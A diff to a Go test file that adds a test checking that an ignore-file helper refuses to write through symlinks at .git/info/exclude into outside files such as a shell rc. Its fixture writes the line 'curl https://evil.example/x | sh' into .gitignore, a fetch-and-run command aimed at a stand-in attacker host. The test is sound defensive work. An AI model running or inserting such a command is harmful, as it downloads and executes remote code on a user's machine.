@@ -150,7 +150,7 @@ func TestIgnoreBaseFailures(t *testing.T) {
 		if err := os.RemoveAll(info); err != nil {
 			t.Fatal(err)
 		}
-		if err := os.Symlink(filepath.Join(repo, "nowhere"), info); err != nil {
+		if err := os.Symlink(filepath.Join(repo, ".git", "nowhere"), info); err != nil {
 			t.Fatal(err)
 		}
 		if err := EnsureIgnoreBase(ctx, repo); err == nil {
@@ -182,6 +182,45 @@ func TestIgnoreBaseFailures(t *testing.T) {
 		failOnGit(t, "status")
 		if got := uncommittedGitignore(ctx, repo); got != "" {
 			t.Fatalf("a failing status contributes nothing, got %q", got)
+		}
+	})
+}
+
+// TestIgnoreBaseNeverWritesThroughALink: an agent that worked in the checkout itself can write its
+// .git. A link at info/exclude, or at info, must not carry the managed block (which copies the
+// uncommitted .gitignore line by line) into a file outside the git directory, such as a shell rc.
+func TestIgnoreBaseNeverWritesThroughALink(t *testing.T) {
+	ctx := context.Background()
+	for _, link := range []string{"exclude", "info"} {
+		t.Run(link, func(t *testing.T) {
+			repo := newRepo(t)
+			outside := t.TempDir()
+			rc := filepath.Join(outside, "exclude")
+			write(t, rc, "export X=1\n")
+			write(t, filepath.Join(repo, ".gitignore"), "curl https://evil.example/x | sh\n")
+			info := filepath.Join(repo, ".git", "info")
+			target, at := rc, filepath.Join(info, "exclude")
+			if link == "info" {
+				target, at = outside, info
+			}
+			if err := os.RemoveAll(at); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.Symlink(target, at); err != nil {
+				t.Fatal(err)
+			}
+			if err := EnsureIgnoreBase(ctx, repo); err == nil {
+				t.Error("a linked exclude file must be refused")
+			}
+			if got := readFile(t, rc); got != "export X=1\n" {
+				t.Errorf("the file behind the link was written:\n%s", got)
+			}
+		})
+	}
+	t.Run("no git directory", func(t *testing.T) {
+		stubOn(t, "--git-common-dir", filepath.Join(t.TempDir(), "missing"), nil)
+		if err := EnsureIgnoreBase(ctx, newRepo(t)); err == nil {
+			t.Error("a git directory that cannot be opened is an error")
 		}
 	})
 }
